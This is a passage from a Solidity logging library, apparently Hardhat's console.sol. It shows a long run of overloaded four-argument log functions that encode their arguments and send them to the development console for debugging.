686	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,address,bool)", p0, p1, p2, p3));
687	 }
688	 function log(uint p0, uint p1, address p2, address p3) internal view {
689	 _sendLogPayload(abi.encodeWithSignature("log(uint,uint,address,address)", p0, p1, p2, p3));
690	 }
691	 function log(uint p0, string memory p1, uint p2, uint p3) internal view {
692	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,uint,uint)", p0, p1, p2, p3));
693	 }
694	 function log(uint p0, string memory p1, uint p2, string memory p3) internal view {
695	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,uint,string)", p0, p1, p2, p3));
696	 }
697	 function log(uint p0, string memory p1, uint p2, bool p3) internal view {
698	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,uint,bool)", p0, p1, p2, p3));
699	 }
700	 function log(uint p0, string memory p1, uint p2, address p3) internal view {
701	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,uint,address)", p0, p1, p2, p3));
702	 }
703	 function log(uint p0, string memory p1, string memory p2, uint p3) internal view {
704	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,string,uint)", p0, p1, p2, p3));
705	 }
706	 function log(uint p0, string memory p1, string memory p2, string memory p3) internal view {
707	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,string,string)", p0, p1, p2, p3));
708	 }
709	 function log(uint p0, string memory p1, string memory p2, bool p3) internal view {
710	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,string,bool)", p0, p1, p2, p3));
711	 }
712	 function log(uint p0, string memory p1, string memory p2, address p3) internal view {
713	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,string,address)", p0, p1, p2, p3));
714	 }
715	 function log(uint p0, string memory p1, bool p2, uint p3) internal view {
716	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,bool,uint)", p0, p1, p2, p3));
717	 }
718	 function log(uint p0, string memory p1, bool p2, string memory p3) internal view {
719	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,bool,string)", p0, p1, p2, p3));
720	 }
721	 function log(uint p0, string memory p1, bool p2, bool p3) internal view {
722	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,bool,bool)", p0, p1, p2, p3));
723	 }
724	 function log(uint p0, string memory p1, bool p2, address p3) internal view {
725	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,bool,address)", p0, p1, p2, p3));
726	 }
727	 function log(uint p0, string memory p1, address p2, uint p3) internal view {
728	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,address,uint)", p0, p1, p2, p3));
729	 }
730	 function log(uint p0, string memory p1, address p2, string memory p3) internal view {
731	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,address,string)", p0, p1, p2, p3));
732	 }
733	 function log(uint p0, string memory p1, address p2, bool p3) internal view {
734	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,address,bool)", p0, p1, p2, p3));
735	 }
736	 function log(uint p0, string memory p1, address p2, address p3) internal view {
737	 _sendLogPayload(abi.encodeWithSignature("log(uint,string,address,address)", p0, p1, p2, p3));
738	 }
739	 function log(uint p0, bool p1, uint p2, uint p3) internal view {
740	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint,uint)", p0, p1, p2, p3));
741	 }
742	 function log(uint p0, bool p1, uint p2, string memory p3) internal view {
743	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint,string)", p0, p1, p2, p3));
744	 }
745	 function log(uint p0, bool p1, uint p2, bool p3) internal view {
746	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint,bool)", p0, p1, p2, p3));
747	 }
748	 function log(uint p0, bool p1, uint p2, address p3) internal view {
749	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,uint,address)", p0, p1, p2, p3));
750	 }
751	 function log(uint p0, bool p1, string memory p2, uint p3) internal view {
752	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,string,uint)", p0, p1, p2, p3));
753	 }
754	 function log(uint p0, bool p1, string memory p2, string memory p3) internal view {
755	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,string,string)", p0, p1, p2, p3));
756	 }
757	 function log(uint p0, bool p1, string memory p2, bool p3) internal view {
758	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,string,bool)", p0, p1, p2, p3));
759	 }
760	 function log(uint p0, bool p1, string memory p2, address p3) internal view {
761	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,string,address)", p0, p1, p2, p3));
762	 }
763	 function log(uint p0, bool p1, bool p2, uint p3) internal view {
764	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool,uint)", p0, p1, p2, p3));
765	 }
766	 function log(uint p0, bool p1, bool p2, string memory p3) internal view {
767	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool,string)", p0, p1, p2, p3));
768	 }
769	 function log(uint p0, bool p1, bool p2, bool p3) internal view {
770	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool,bool)", p0, p1, p2, p3));
771	 }
772	 function log(uint p0, bool p1, bool p2, address p3) internal view {
773	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,bool,address)", p0, p1, p2, p3));
774	 }
775	 function log(uint p0, bool p1, address p2, uint p3) internal view {
776	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,address,uint)", p0, p1, p2, p3));
777	 }
778	 function log(uint p0, bool p1, address p2, string memory p3) internal view {
779	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,address,string)", p0, p1, p2, p3));
780	 }
781	 function log(uint p0, bool p1, address p2, bool p3) internal view {
782	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,address,bool)", p0, p1, p2, p3));
783	 }
784	 function log(uint p0, bool p1, address p2, address p3) internal view {
785	 _sendLogPayload(abi.encodeWithSignature("log(uint,bool,address,address)", p0, p1, p2, p3));
786	 }
787	 function log(uint p0, address p1, uint p2, uint p3) internal view {
788	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,uint,uint)", p0, p1, p2, p3));
789	 }
790	 function log(uint p0, address p1, uint p2, string memory p3) internal view {
791	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,uint,string)", p0, p1, p2, p3));
792	 }
793	 function log(uint p0, address p1, uint p2, bool p3) internal view {
794	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,uint,bool)", p0, p1, p2, p3));
795	 }
796	 function log(uint p0, address p1, uint p2, address p3) internal view {
797	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,uint,address)", p0, p1, p2, p3));
798	 }
799	 function log(uint p0, address p1, string memory p2, uint p3) internal view {
800	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,string,uint)", p0, p1, p2, p3));
801	 }
802	 function log(uint p0, address p1, string memory p2, string memory p3) internal view {
803	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,string,string)", p0, p1, p2, p3));
804	 }
805	 function log(uint p0, address p1, string memory p2, bool p3) internal view {
806	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,string,bool)", p0, p1, p2, p3));
807	 }
808	 function log(uint p0, address p1, string memory p2, address p3) internal view {
809	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,string,address)", p0, p1, p2, p3));
810	 }
811	 function log(uint p0, address p1, bool p2, uint p3) internal view {
812	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,bool,uint)", p0, p1, p2, p3));
813	 }
814	 function log(uint p0, address p1, bool p2, string memory p3) internal view {
815	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,bool,string)", p0, p1, p2, p3));
816	 }
817	 function log(uint p0, address p1, bool p2, bool p3) internal view {
818	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,bool,bool)", p0, p1, p2, p3));
819	 }
820	 function log(uint p0, address p1, bool p2, address p3) internal view {
821	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,bool,address)", p0, p1, p2, p3));
822	 }
823	 function log(uint p0, address p1, address p2, uint p3) internal view {
824	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,address,uint)", p0, p1, p2, p3));
825	 }
826	 function log(uint p0, address p1, address p2, string memory p3) internal view {
827	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,address,string)", p0, p1, p2, p3));
828	 }
829	 function log(uint p0, address p1, address p2, bool p3) internal view {
830	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,address,bool)", p0, p1, p2, p3));
831	 }
832	 function log(uint p0, address p1, address p2, address p3) internal view {
833	 _sendLogPayload(abi.encodeWithSignature("log(uint,address,address,address)", p0, p1, p2, p3));
834	 }
835	 function log(string memory p0, uint p1, uint p2, uint p3) internal view {
836	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,uint,uint)", p0, p1, p2, p3));
837	 }
838	 function log(string memory p0, uint p1, uint p2, string memory p3) internal view {
839	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,uint,string)", p0, p1, p2, p3));
840	 }
841	 function log(string memory p0, uint p1, uint p2, bool p3) internal view {
842	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,uint,bool)", p0, p1, p2, p3));
843	 }
844	 function log(string memory p0, uint p1, uint p2, address p3) internal view {
845	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,uint,address)", p0, p1, p2, p3));
846	 }
847	 function log(string memory p0, uint p1, string memory p2, uint p3) internal view {
848	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,string,uint)", p0, p1, p2, p3));
849	 }
850	 function log(string memory p0, uint p1, string memory p2, string memory p3) internal view {
851	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,string,string)", p0, p1, p2, p3));
852	 }
853	 function log(string memory p0, uint p1, string memory p2, bool p3) internal view {
854	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,string,bool)", p0, p1, p2, p3));
855	 }
856	 function log(string memory p0, uint p1, string memory p2, address p3) internal view {
857	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,string,address)", p0, p1, p2, p3));
858	 }
859	 function log(string memory p0, uint p1, bool p2, uint p3) internal view {
860	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,bool,uint)", p0, p1, p2, p3));
861	 }
862	 function log(string memory p0, uint p1, bool p2, string memory p3) internal view {
863	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,bool,string)", p0, p1, p2, p3));
864	 }
865	 function log(string memory p0, uint p1, bool p2, bool p3) internal view {
866	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,bool,bool)", p0, p1, p2, p3));
867	 }
868	 function log(string memory p0, uint p1, bool p2, address p3) internal view {
869	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,bool,address)", p0, p1, p2, p3));
870	 }
871	 function log(string memory p0, uint p1, address p2, uint p3) internal view {
872	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,address,uint)", p0, p1, p2, p3));
873	 }
874	 function log(string memory p0, uint p1, address p2, string memory p3) internal view {
875	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,address,string)", p0, p1, p2, p3));
876	 }
877	 function log(string memory p0, uint p1, address p2, bool p3) internal view {
878	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,address,bool)", p0, p1, p2, p3));
879	 }
880	 function log(string memory p0, uint p1, address p2, address p3) internal view {
881	 _sendLogPayload(abi.encodeWithSignature("log(string,uint,address,address)", p0, p1, p2, p3));
882	 }
883	 function log(string memory p0, string memory p1, uint p2, uint p3) internal view {
884	 _sendLogPayload(abi.encodeWithSignature("log(string,string,uint,uint)", p0, p1, p2, p3));
885	 }
886	 function log(string memory p0, string memory p1, uint p2, string memory p3) internal view {
887	 _sendLogPayload(abi.encodeWithSignature("log(string,string,uint,string)", p0, p1, p2, p3));
888	 }
889	 function log(string memory p0, string memory p1, uint p2, bool p3) internal view {
890	 _sendLogPayload(abi.encodeWithSignature("log(string,string,uint,bool)", p0, p1, p2, p3));
891	 }
892	 function log(string memory p0, string memory p1, uint p2, address p3) internal view {
893	 _sendLogPayload(abi.encodeWithSignature("log(string,string,uint,address)", p0, p1, p2, p3));
894	 }
895	 function log(string memory p0, string memory p1, string memory p2, uint p3) internal view {
896	 _sendLogPayload(abi.encodeWithSignature("log(string,string,string,uint)", p0, p1, p2, p3));
897	 }
898	 function log(string memory p0, string memory p1, string memory p2, string memory p3) internal view {
899	 _sendLogPayload(abi.encodeWithSignature("log(string,string,string,string)", p0, p1, p2, p3));
900	 }
901	 function log(string memory p0, string memory p1, string memory p2, bool p3) internal view {
902	 _sendLogPayload(abi.encodeWithSignature("log(string,string,string,bool)", p0, p1, p2, p3));
903	 }
904	 function log(string memory p0, string memory p1, string memory p2, address p3) internal view {
905	 _sendLogPayload(abi.encodeWithSignature("log(string,string,string,address)", p0, p1, p2, p3));
906	 }
907	 function log(string memory p0, string memory p1, bool p2, uint p3) internal view {
908	 _sendLogPayload(abi.encodeWithSignature("log(string,string,bool,uint)", p0, p1, p2, p3));
909	 }
910	 function log(string memory p0, string memory p1, bool p2, string memory p3) internal view {
911	 _sendLogPayload(abi.encodeWithSignature("log(string,string,bool,string)", p0, p1, p2, p3));
912	 }
913	 function log(string memory p0, string memory p1, bool p2, bool p3) internal view {
914	 _sendLogPayload(abi.encodeWithSignature("log(string,string,bool,bool)", p0, p1, p2, p3));
915	 }
916	 function log(string memory p0, string memory p1, bool p2, address p3) internal view {
917	 _sendLogPayload(abi.encodeWithSignature("log(string,string,bool,address)", p0, p1, p2, p3));
918	 }
919	 function log(string memory p0, string memory p1, address p2, uint p3) internal view {
920	 _sendLogPayload(abi.encodeWithSignature("log(string,string,address,uint)", p0, p1, p2, p3));
921	 }
922	 function log(string memory p0, string memory p1, address p2, string memory p3) internal view {
923	 _sendLogPayload(abi.encodeWithSignature("log(string,string,address,string)", p0, p1, p2, p3));
924	 }
925	 function log(string memory p0, string memory p1, address p2, bool p3) internal view {
926	 _sendLogPayload(abi.encodeWithSignature("log(string,string,address,bool)", p0, p1, p2, p3));
927	 }
928	 function log(string memory p0, string memory p1, address p2, address p3) internal view {
929	 _sendLogPayload(abi.encodeWithSignature("log(string,string,address,address)", p0, p1, p2, p3));
930	 }
931	 function log(string memory p0, bool p1, uint p2, uint p3) internal view {
932	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,uint,uint)", p0, p1, p2, p3));
933	 }
934	 function log(string memory p0, bool p1, uint p2, string memory p3) internal view {
935	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,uint,string)", p0, p1, p2, p3));
936	 }
937	 function log(string memory p0, bool p1, uint p2, bool p3) internal view {
938	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,uint,bool)", p0, p1, p2, p3));
939	 }
940	 function log(string memory p0, bool p1, uint p2, address p3) internal view {
941	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,uint,address)", p0, p1, p2, p3));
942	 }
943	 function log(string memory p0, bool p1, string memory p2, uint p3) internal view {
944	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,string,uint)", p0, p1, p2, p3));
945	 }
946	 function log(string memory p0, bool p1, string memory p2, string memory p3) internal view {
947	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,string,string)", p0, p1, p2, p3));
948	 }
949	 function log(string memory p0, bool p1, string memory p2, bool p3) internal view {
950	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,string,bool)", p0, p1, p2, p3));
951	 }
952	 function log(string memory p0, bool p1, string memory p2, address p3) internal view {
953	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,string,address)", p0, p1, p2, p3));
954	 }
955	 function log(string memory p0, bool p1, bool p2, uint p3) internal view {
956	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,bool,uint)", p0, p1, p2, p3));
957	 }
958	 function log(string memory p0, bool p1, bool p2, string memory p3) internal view {
959	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,bool,string)", p0, p1, p2, p3));
960	 }
961	 function log(string memory p0, bool p1, bool p2, bool p3) internal view {
962	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,bool,bool)", p0, p1, p2, p3));
963	 }
964	 function log(string memory p0, bool p1, bool p2, address p3) internal view {
965	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,bool,address)", p0, p1, p2, p3));
966	 }
967	 function log(string memory p0, bool p1, address p2, uint p3) internal view {
968	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,address,uint)", p0, p1, p2, p3));
969	 }
970	 function log(string memory p0, bool p1, address p2, string memory p3) internal view {
971	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,address,string)", p0, p1, p2, p3));
972	 }
973	 function log(string memory p0, bool p1, address p2, bool p3) internal view {
974	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,address,bool)", p0, p1, p2, p3));
975	 }
976	 function log(string memory p0, bool p1, address p2, address p3) internal view {
977	 _sendLogPayload(abi.encodeWithSignature("log(string,bool,address,address)", p0, p1, p2, p3));
978	 }
979	 function log(string memory p0, address p1, uint p2, uint p3) internal view {
980	 _sendLogPayload(abi.encodeWithSignature("log(string,address,uint,uint)", p0, p1, p2, p3));
981	 }
982	 function log(string memory p0, address p1, uint p2, string memory p3) internal view {
983	 _sendLogPayload(abi.encodeWithSignature("log(string,address,uint,string)", p0, p1, p2, p3));
984	 }
985	 function log(string memory p0, address p1, uint p2, bool p3) internal view {
986	 _sendLogPayload(abi.encodeWithSignature("log(string,address,uint,bool)", p0, p1, p2, p3));
987	 }
988	 function log(string memory p0, address p1, uint p2, address p3) internal view {
989	 _sendLogPayload(abi.encodeWithSignature("log(string,address,uint,address)", p0, p1, p2, p3));
990	 }
991	 function log(string memory p0, address p1, string memory p2, uint p3) internal view {
992	 _sendLogPayload(abi.encodeWithSignature("log(string,address,string,uint)", p0, p1, p2, p3));
993	 }
994	 function log(string memory p0, address p1, string memory p2, string memory p3) internal view {
995	 _sendLogPayload(abi.encodeWithSignature("log(string,address,string,string)", p0, p1, p2, p3));
996	 }
997	 function log(string memory p0, address p1, string memory p2, bool p3) internal view {
998	 _sendLogPayload(abi.encodeWithSignature("log(string,address,string,bool)", p0, p1, p2, p3));
999	 }
1000	 function log(string memory p0, address p1, string memory p2, address p3) internal view {
1001	 _sendLogPayload(abi.encodeWithSignature("log(string,address,string,address)", p0, p1, p2, p3));
1002	 }
1003	 function log(string memory p0, address p1, bool p2, uint p3) internal view {
1004	 _sendLogPayload(abi.encodeWithSignature("log(string,address,bool,uint)", p0, p1, p2, p3));
1005	 }
1006	 function log(string memory p0, address p1, bool p2, string memory p3) internal view {
1007	 _sendLogPayload(abi.encodeWithSignature("log(string,address,bool,string)", p0, p1, p2, p3));
1008	 }
1009	 function log(string memory p0, address p1, bool p2, bool p3) internal view {
1010	 _sendLogPayload(abi.encodeWithSignature("log(string,address,bool,bool)", p0, p1, p2, p3));
1011	 }
1012	 function log(string memory p0, address p1, bool p2, address p3) internal view {
1013	 _sendLogPayload(abi.encodeWithSignature("log(string,address,bool,address)", p0, p1, p2, p3));
1014	 }
1015	 function log(string memory p0, address p1, address p2, uint p3) internal view {
1016	 _sendLogPayload(abi.encodeWithSignature("log(string,address,address,uint)", p0, p1, p2, p3));
1017	 }
1018	 function log(string memory p0, address p1, address p2, string memory p3) internal view {
1019	 _sendLogPayload(abi.encodeWithSignature("log(string,address,address,string)", p0, p1, p2, p3));
1020	 }
1021	 function log(string memory p0, address p1, address p2, bool p3) internal view {
1022	 _sendLogPayload(abi.encodeWithSignature("log(string,address,address,bool)", p0, p1, p2, p3));
1023	 }
1024	 function log(string memory p0, address p1, address p2, address p3) internal view {
1025	 _sendLogPayload(abi.encodeWithSignature("log(string,address,address,address)", p0, p1, p2, p3));
1026	 }
1027	 function log(bool p0, uint p1, uint p2, uint p3) internal view {
1028	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint,uint)", p0, p1, p2, p3));
1029	 }
1030	 function log(bool p0, uint p1, uint p2, string memory p3) internal view {
1031	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint,string)", p0, p1, p2, p3));
1032	 }
1033	 function log(bool p0, uint p1, uint p2, bool p3) internal view {
1034	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint,bool)", p0, p1, p2, p3));
1035	 }
1036	 function log(bool p0, uint p1, uint p2, address p3) internal view {
1037	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,uint,address)", p0, p1, p2, p3));
1038	 }
1039	 function log(bool p0, uint p1, string memory p2, uint p3) internal view {
1040	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,string,uint)", p0, p1, p2, p3));
1041	 }
1042	 function log(bool p0, uint p1, string memory p2, string memory p3) internal view {
1043	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,string,string)", p0, p1, p2, p3));
1044	 }
1045	 function log(bool p0, uint p1, string memory p2, bool p3) internal view {
1046	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,string,bool)", p0, p1, p2, p3));
1047	 }
1048	 function log(bool p0, uint p1, string memory p2, address p3) internal view {
1049	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,string,address)", p0, p1, p2, p3));
1050	 }
1051	 function log(bool p0, uint p1, bool p2, uint p3) internal view {
1052	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool,uint)", p0, p1, p2, p3));
1053	 }
1054	 function log(bool p0, uint p1, bool p2, string memory p3) internal view {
1055	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool,string)", p0, p1, p2, p3));
1056	 }
1057	 function log(bool p0, uint p1, bool p2, bool p3) internal view {
1058	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool,bool)", p0, p1, p2, p3));
1059	 }
1060	 function log(bool p0, uint p1, bool p2, address p3) internal view {
1061	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,bool,address)", p0, p1, p2, p3));
1062	 }
1063	 function log(bool p0, uint p1, address p2, uint p3) internal view {
1064	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,address,uint)", p0, p1, p2, p3));
1065	 }
1066	 function log(bool p0, uint p1, address p2, string memory p3) internal view {
1067	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,address,string)", p0, p1, p2, p3));
1068	 }
1069	 function log(bool p0, uint p1, address p2, bool p3) internal view {
1070	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,address,bool)", p0, p1, p2, p3));
1071	 }
1072	 function log(bool p0, uint p1, address p2, address p3) internal view {
1073	 _sendLogPayload(abi.encodeWithSignature("log(bool,uint,address,address)", p0, p1, p2, p3));
1074	 }
1075	 function log(bool p0, string memory p1, uint p2, uint p3) internal view {
1076	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,uint,uint)", p0, p1, p2, p3));
1077	 }
1078	 function log(bool p0, string memory p1, uint p2, string memory p3) internal view {
1079	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,uint,string)", p0, p1, p2, p3));
1080	 }
1081	 function log(bool p0, string memory p1, uint p2, bool p3) internal view {
1082	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,uint,bool)", p0, p1, p2, p3));
1083	 }
1084	 function log(bool p0, string memory p1, uint p2, address p3) internal view {
1085	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,uint,address)", p0, p1, p2, p3));
1086	 }
1087	 function log(bool p0, string memory p1, string memory p2, uint p3) internal view {
1088	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,string,uint)", p0, p1, p2, p3));
1089	 }
1090	 function log(bool p0, string memory p1, string memory p2, string memory p3) internal view {
1091	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,string,string)", p0, p1, p2, p3));
1092	 }
1093	 function log(bool p0, string memory p1, string memory p2, bool p3) internal view {
1094	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,string,bool)", p0, p1, p2, p3));
1095	 }
1096	 function log(bool p0, string memory p1, string memory p2, address p3) internal view {
1097	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,string,address)", p0, p1, p2, p3));
1098	 }
1099	 function log(bool p0, string memory p1, bool p2, uint p3) internal view {
1100	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,bool,uint)", p0, p1, p2, p3));
1101	 }
1102	 function log(bool p0, string memory p1, bool p2, string memory p3) internal view {
1103	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,bool,string)", p0, p1, p2, p3));
1104	 }
1105	 function log(bool p0, string memory p1, bool p2, bool p3) internal view {
1106	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,bool,bool)", p0, p1, p2, p3));
1107	 }
1108	 function log(bool p0, string memory p1, bool p2, address p3) internal view {
1109	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,bool,address)", p0, p1, p2, p3));
1110	 }
1111	 function log(bool p0, string memory p1, address p2, uint p3) internal view {
1112	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,address,uint)", p0, p1, p2, p3));
1113	 }
1114	 function log(bool p0, string memory p1, address p2, string memory p3) internal view {
1115	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,address,string)", p0, p1, p2, p3));
1116	 }
1117	 function log(bool p0, string memory p1, address p2, bool p3) internal view {
1118	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,address,bool)", p0, p1, p2, p3));
1119	 }
1120	 function log(bool p0, string memory p1, address p2, address p3) internal view {
1121	 _sendLogPayload(abi.encodeWithSignature("log(bool,string,address,address)", p0, p1, p2, p3));
1122	 }
1123	 function log(bool p0, bool p1, uint p2, uint p3) internal view {
1124	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint,uint)", p0, p1, p2, p3));
1125	 }
1126	 function log(bool p0, bool p1, uint p2, string memory p3) internal view {
1127	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint,string)", p0, p1, p2, p3));
1128	 }
1129	 function log(bool p0, bool p1, uint p2, bool p3) internal view {
1130	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint,bool)", p0, p1, p2, p3));
1131	 }
1132	 function log(bool p0, bool p1, uint p2, address p3) internal view {
1133	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,uint,address)", p0, p1, p2, p3));
1134	 }
1135	 function log(bool p0, bool p1, string memory p2, uint p3) internal view {
1136	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,string,uint)", p0, p1, p2, p3));
1137	 }
1138	 function log(bool p0, bool p1, string memory p2, string memory p3) internal view {
1139	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,string,string)", p0, p1, p2, p3));
1140	 }
1141	 function log(bool p0, bool p1, string memory p2, bool p3) internal view {
1142	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,string,bool)", p0, p1, p2, p3));
1143	 }
1144	 function log(bool p0, bool p1, string memory p2, address p3) internal view {
1145	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,string,address)", p0, p1, p2, p3));
1146	 }
1147	 function log(bool p0, bool p1, bool p2, uint p3) internal view {
1148	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool,uint)", p0, p1, p2, p3));
1149	 }
1150	 function log(bool p0, bool p1, bool p2, string memory p3) internal view {
1151	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool,string)", p0, p1, p2, p3));
1152	 }
1153	 function log(bool p0, bool p1, bool p2, bool p3) internal view {
1154	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool,bool)", p0, p1, p2, p3));
1155	 }
1156	 function log(bool p0, bool p1, bool p2, address p3) internal view {
1157	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,bool,address)", p0, p1, p2, p3));
1158	 }
1159	 function log(bool p0, bool p1, address p2, uint p3) internal view {
1160	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,address,uint)", p0, p1, p2, p3));
1161	 }
1162	 function log(bool p0, bool p1, address p2, string memory p3) internal view {
1163	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,address,string)", p0, p1, p2, p3));
1164	 }
1165	 function log(bool p0, bool p1, address p2, bool p3) internal view {
1166	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,address,bool)", p0, p1, p2, p3));
1167	 }
1168	 function log(bool p0, bool p1, address p2, address p3) internal view {
1169	 _sendLogPayload(abi.encodeWithSignature("log(bool,bool,address,address)", p0, p1, p2, p3));
1170	 }
1171	 function log(bool p0, address p1, uint p2, uint p3) internal view {
1172	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,uint,uint)", p0, p1, p2, p3));
1173	 }
1174	 function log(bool p0, address p1, uint p2, string memory p3) internal view {
1175	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,uint,string)", p0, p1, p2, p3));
1176	 }
1177	 function log(bool p0, address p1, uint p2, bool p3) internal view {
1178	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,uint,bool)", p0, p1, p2, p3));
1179	 }
1180	 function log(bool p0, address p1, uint p2, address p3) internal view {
1181	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,uint,address)", p0, p1, p2, p3));
1182	 }
1183	 function log(bool p0, address p1, string memory p2, uint p3) internal view {
1184	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,string,uint)", p0, p1, p2, p3));
1185	 }
1186	 function log(bool p0, address p1, string memory p2, string memory p3) internal view {
1187	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,string,string)", p0, p1, p2, p3));
1188	 }
1189	 function log(bool p0, address p1, string memory p2, bool p3) internal view {
1190	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,string,bool)", p0, p1, p2, p3));
1191	 }
1192	 function log(bool p0, address p1, string memory p2, address p3) internal view {
1193	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,string,address)", p0, p1, p2, p3));
1194	 }
1195	 function log(bool p0, address p1, bool p2, uint p3) internal view {
1196	 _sendLogPayload(abi.encodeWithSignature("log(bool,address,bool,uint)", p0, p1, p2, p3));
1197	 }
1198	 function log(bool p0, address p1, bool p2, string memory p3) internal view {
